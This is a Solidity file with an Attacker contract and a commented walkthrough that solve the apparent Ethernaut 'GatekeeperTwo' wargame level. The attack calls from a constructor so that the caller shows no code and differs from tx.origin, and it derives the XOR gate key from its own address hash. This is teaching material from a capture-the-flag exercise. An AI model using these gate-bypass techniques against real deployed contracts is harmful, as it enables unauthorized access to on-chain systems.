// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    constructor(GatekeeperTwo target) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;

        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    // Require that the caller is not the original transaction sender
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    // Require that the caller does not have any code associated with it. So we need to execute the code in the constructor.
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    // Generate a random value by hashing the sender's address
    // XOR the senderHash with the gate key to obtain the original random value 's'
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

/**
Explanation:

The Attacker contract is created to exploit the GatekeeperTwo contract.

The constructor function of the Attacker contract takes a GatekeeperTwo instance as an argument.

Inside the constructor, a random value s is generated by hashing the address of the Attacker contract 
and converting it to a uint64.

The random value s is XORed with the maximum value of uint64 to obtain k.

k is converted to bytes8 and assigned to the key variable.

The enter function of the target GatekeeperTwo contract is called with the key as an argument.

The gateOne modifier checks that the caller is not the original transaction sender (msg.sender is not equal to tx.origin).

The gateTwo modifier checks that the caller does not have any associated code by using the extcodesize assembly opcode. We 
pass that by writing the code in the constructor.

The gateThree modifier generates a random value by hashing the sender's address and XORs it with the _gateKey to obtain the 
original random value s. It compares s with the maximum value of uint64 to ensure they are equal.

If all the modifiers pass, the enter function updates the entrant variable with the transaction origin (tx.origin) and 
returns true.
 */